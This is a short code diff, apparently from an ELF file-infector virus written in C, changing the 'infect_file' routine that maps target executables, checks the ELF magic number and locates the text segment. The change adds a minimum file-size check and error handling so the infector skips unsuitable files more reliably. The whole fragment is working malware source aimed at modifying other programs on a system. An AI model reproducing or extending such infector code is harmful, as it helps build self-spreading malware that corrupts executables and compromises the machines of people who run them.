@@ -194,13 +194,14 @@ static void		infect_file(char *path)
 	init_info(&info);
 	ft_sysfstat(fd, &st);
 	info.file_size = st.st_size;
-	if (info.file_size > 50*1024*1024)
+	if ((info.file_size > 50*1024*1024) || info.file_size < sizeof(Elf64_Ehdr) + sizeof(Elf64_Phdr))
 		goto end_close;
 	if ((info.file = ft_sysmmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
 		goto end_close;
 	if ((magic = *((uint32_t *)(info.file))) != 0x464C457F)
 		goto end_fct;
-	pe_parsing(&info);
+	if (pe_parsing(&info) == 1)
+		goto end_fct;
 	if (reload_mapping(&info) == 1)
 		goto end_fct;
 	if (find_text(&info) == 1)
